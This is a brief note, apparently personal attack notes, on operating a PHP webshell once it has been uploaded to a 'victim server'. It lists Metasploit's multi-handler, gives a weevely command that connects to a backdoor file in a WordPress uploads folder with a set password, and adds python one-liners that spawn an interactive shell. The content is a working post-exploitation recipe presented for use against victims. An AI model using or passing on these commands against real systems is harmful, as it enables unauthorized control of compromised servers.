PHP Webshell

There are many ways of using this webshell once uploaded on victim server
Methods:
* use MetsSploit and use miltihandler
* use weevley 
 weevely http://<IP>/wp-content/uploads/2016/08/phpbackdoor.php letmein
Below lines imports bash and starts a new shell. From here you will able to run commands as normal.
 python -c 'import pty; pty.spawn("/bin/sh")'
 python -c "import pty;pty.spawn('/bin/bash');"
